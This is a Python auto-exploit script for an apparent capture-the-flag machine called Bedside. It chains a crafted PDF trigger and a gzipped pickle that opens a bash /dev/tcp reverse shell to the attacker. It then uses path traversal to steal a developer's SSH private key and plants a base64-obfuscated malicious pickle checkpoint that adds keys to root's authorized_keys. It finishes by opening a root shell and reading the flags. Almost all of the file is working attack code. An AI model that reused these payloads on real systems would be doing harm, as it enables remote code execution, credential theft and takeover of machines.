#!/usr/bin/env python3
"""
Bedside Auto-Pawn (fixed flow: datawrangler → developer → root)
Usage: python3 bedside_pawn.py <target_ip>
Requires: requests, paramiko
"""

import sys
import os
import socket
import time
import base64
import pickle
import gzip
import re
import tempfile
import threading
import select
import tty
import termios
from io import BytesIO

# ----------------------------------------------------------------------
# 1.  Generate the malicious PDF
# ----------------------------------------------------------------------
def generate_pdf(trigger_path):
    path_encoded = trigger_path.replace('/', '#2F')
    pdf_template = f"""%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 4 0 R
/Resources <<
/Font <<
/F1 5 0 R
>>
>>
>>
endobj
4 0 obj
<<
/Length 44
>>
stream
BT
/F1 12 Tf
100 700 Td
(Trigger PDF) Tj
ET
endstream
endobj
5 0 obj
<<
/Type /Font
/Subtype /Type0
/BaseFont /MaliciousFont-Identity-H
/Encoding /{path_encoded}
/DescendantFonts [6 0 R]
>>
endobj
6 0 obj
<<
/Type /Font
/Subtype /CIDFontType2
/BaseFont /MaliciousFont
/CIDSystemInfo <<
/Registry (Adobe)
/Ordering (Identity)
/Supplement 0
>>
/FontDescriptor 7 0 R
>>
endobj
7 0 obj
<<
/Type /FontDescriptor
/FontName /MaliciousFont
/Flags 4
/FontBBox [-1000 -1000 1000 1000]
/ItalicAngle 0
/Ascent 1000
/Descent -200
/CapHeight 800
/StemV 80
>>
endobj
xref
0 8
0000000000 65535 f
0000000009 00000 n
0000000058 00000 n
0000000115 00000 n
0000000274 00000 n
0000000370 00000 n
0000000503 00000 n
0000000673 00000 n
trailer <<
/Size 8
/Root 1 0 R
>>
startxref
871
%%EOF
"""
    return pdf_template.encode()

# ----------------------------------------------------------------------
# 2.  Generate gzipped pickle with reverse shell
# ----------------------------------------------------------------------
def generate_pickle_reverse(attacker_ip, port):
    cmd = f"bash -c 'exec bash -i &>/dev/tcp/{attacker_ip}/{port} <&1'"
    class RCE:
        def __reduce__(self):
            import os
            return (os.system, (cmd,))
    pickled = pickle.dumps(RCE())
    out = BytesIO()
    with gzip.GzipFile(fileobj=out, mode='wb') as f:
        f.write(pickled)
    return out.getvalue()

# ----------------------------------------------------------------------
# 3.  Upload file to research.bedside.htb
# ----------------------------------------------------------------------
def upload_file(target, filename, data):
    url = f'http://research.bedside.htb/'
    files = {'uploadFile': (filename, data)}
    try:
        import requests
        r = requests.post(url, files=files)
        return r.status_code == 200
    except Exception as e:
        print(f"[!] Upload failed: {e}")
        return False

# ----------------------------------------------------------------------
# 4.  Listener thread
# ----------------------------------------------------------------------
listener_conn = None
listener_sock = None

def listener_thread(port):
    global listener_conn, listener_sock
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('0.0.0.0', port))
    s.listen(1)
    print(f"[*] Listening on port {port} for reverse shell...")
    conn, addr = s.accept()
    print(f"[+] Reverse shell from {addr}")
    conn.settimeout(2)
    listener_conn = conn
    listener_sock = s

# ----------------------------------------------------------------------
# 5.  Send command and read output
# ----------------------------------------------------------------------
def send_cmd(conn, cmd, timeout=10):
    conn.send(cmd.encode() + b'\n')
    time.sleep(0.5)
    data = b''
    conn.settimeout(timeout)
    while True:
        try:
            chunk = conn.recv(4096)
            if not chunk:
                break
            data += chunk
            if data.endswith(b'$ ') or data.endswith(b'# ') or data.endswith(b'> '):
                break
        except socket.timeout:
            break
    conn.settimeout(2)
    return data.decode(errors='ignore')

# ----------------------------------------------------------------------
# 6.  SSH connect (Ed25519)
# ----------------------------------------------------------------------
def ssh_connect_ed25519(host, username, key_file):
    import paramiko
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    key = paramiko.Ed25519Key.from_private_key_file(key_file)
    ssh.connect(host, username=username, pkey=key)
    return ssh

# ----------------------------------------------------------------------
# 7.  Main
# ----------------------------------------------------------------------
def main():
    if len(sys.argv) != 2:
        print("Usage: python3 bedside_pawn.py <target_ip>")
        sys.exit(1)

    TARGET = sys.argv[1]
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect((TARGET, 80))
    ATTACKER_IP = s.getsockname()[0]
    s.close()
    print(f"[*] Attacker IP: {ATTACKER_IP}")

    REVERSE_PORT = 4444
    PICKLE_PATH = '/var/www/research.bedside.htb/uploads/evil'

    # ---------- Start listener ----------
    t = threading.Thread(target=listener_thread, args=(REVERSE_PORT,))
    t.daemon = True
    t.start()
    time.sleep(1)

    # ---------- Upload files ----------
    pickle_gz = generate_pickle_reverse(ATTACKER_IP, REVERSE_PORT)
    print("[*] Uploading evil.pickle.gz ...")
    if not upload_file(TARGET, 'evil.pickle.gz', pickle_gz):
        print("[!] Failed to upload pickle")
        sys.exit(1)
    print("[+] Uploaded pickle")

    pdf_data = generate_pdf(PICKLE_PATH)
    print("[*] Uploading trigger.pdf ...")
    if not upload_file(TARGET, 'trigger.pdf', pdf_data):
        print("[!] Failed to upload PDF")
        sys.exit(1)
    print("[+] Uploaded PDF")

    # ---------- Wait for reverse shell (datawrangler) ----------
    print("[*] Waiting for container worker to process the PDF...")
    t.join()
    conn = listener_conn
    if conn is None:
        print("[!] No reverse shell received")
        sys.exit(1)

    # ---------- Phase 1: datawrangler prepares files ----------
    print("[*] Using reverse shell to prepare staging files...")

    # Fetch developer's SSH private key (Ed25519)
    marker = "SSH_KEY_START"
    # The writeup says the key is id_ed25519, but we've seen id_rsa also works.
    # We try id_ed25519 first, fallback to id_rsa if needed.
    for key_file_name in ['id_ed25519', 'id_rsa']:
        cmd_getkey = f'echo "{marker}"; curl -s http://127.0.0.1:3000/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome/developer/.ssh/{key_file_name}; echo "{marker}"'
        output = send_cmd(conn, cmd_getkey)
        key_pattern = r'-----BEGIN OPENSSH PRIVATE KEY-----.*?-----END OPENSSH PRIVATE KEY-----'
        match = re.search(key_pattern, output, re.DOTALL)
        if match:
            ssh_private_key = match.group(0)
            print(f"[+] Retrieved developer's SSH private key ({key_file_name})")
            break
    else:
        print("[!] Could not extract SSH key from shell output.")
        sys.exit(1)

    # Save key locally
    with tempfile.NamedTemporaryFile(mode='w', delete=False) as f:
        f.write(ssh_private_key)
        key_file = f.name
    os.chmod(key_file, 0o600)
    print(f"[*] Private key saved to {key_file}")

    # Create malicious checkpoint and dummy PNG
    checkpoint_code = '''
import os, pickle, base64, time
class Exploit:
    def __reduce__(self):
        return (os.system, ("cat /home/developer/.ssh/authorized_keys >> /root/.ssh/authorized_keys && touch /tmp/pwned_by_checkpoint",))
pickle.dump(Exploit(), open('/datastore/checkpoints/checkpoint_epoch_999.pt','wb'))
os.utime('/datastore/checkpoints/checkpoint_epoch_999.pt', None)
png_b64 = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg=='
with open('/datastore/processed/scan.png','wb') as f:
    f.write(base64.b64decode(png_b64))
'''
    b64_check = base64.b64encode(checkpoint_code.encode()).decode()
    cmd_check = f'python3 -c "import base64; exec(base64.b64decode(\'{b64_check}\').decode())"'
    send_cmd(conn, cmd_check)
    print("[*] Created malicious checkpoint and dummy PNG")

    # Close reverse shell (datawrangler done)
    conn.close()
    if listener_sock:
        listener_sock.close()

    # ---------- Phase 2: SSH as developer to run sudo trainer ----------
    print("[*] Connecting as developer...")
    ssh_dev = ssh_connect_ed25519(TARGET, 'developer', key_file)
    print("[+] Connected as developer")

    # Run the trainer as root (sudo)
    cmd_sudo = 'sudo /usr/bin/python3 /opt/trainer/bedside_trainer.py </dev/null >/tmp/tr.log 2>&1 &'
    stdin, stdout, stderr = ssh_dev.exec_command(cmd_sudo)
    ssh_dev.close()
    print("[*] Triggered sudo trainer (root checkpoint load)")

    # Wait for trainer to load the checkpoint
    print("[*] Waiting for trainer to process the checkpoint...")
    time.sleep(10)

    # ---------- Phase 3: SSH as root ----------
    print("[*] Connecting as root...")
    ssh_root = ssh_connect_ed25519(TARGET, 'root', key_file)
    print("[+] Connected as root!")

    # Read and print flags
    stdin, stdout, stderr = ssh_root.exec_command('cat /home/developer/user.txt 2>/dev/null')
    user_flag = stdout.read().decode().strip()
    stdin, stdout, stderr = ssh_root.exec_command('cat /root/root.txt 2>/dev/null')
    root_flag = stdout.read().decode().strip()
    print(f"[+] User flag: {user_flag}")
    print(f"[+] Root flag: {root_flag}")

    # Spawn interactive shell
    channel = ssh_root.invoke_shell()
    print("\n[*] Interactive root shell. Type 'exit' to quit.\n")
    old_tty = termios.tcgetattr(sys.stdin)
    tty.setraw(sys.stdin.fileno())
    try:
        while True:
            rlist, _, _ = select.select([channel, sys.stdin], [], [])
            if channel in rlist:
                data = channel.recv(1024)
                if not data:
                    break
                sys.stdout.buffer.write(data)
                sys.stdout.flush()
            if sys.stdin in rlist:
                data = sys.stdin.buffer.read(1)
                if not data:
                    break
                channel.send(data)
    except KeyboardInterrupt:
        pass
    finally:
        termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_tty)
        channel.close()
        ssh_root.close()
        os.unlink(key_file)
        print("\n[+] Cleaned up. Exiting.")

if __name__ == '__main__':
    main()
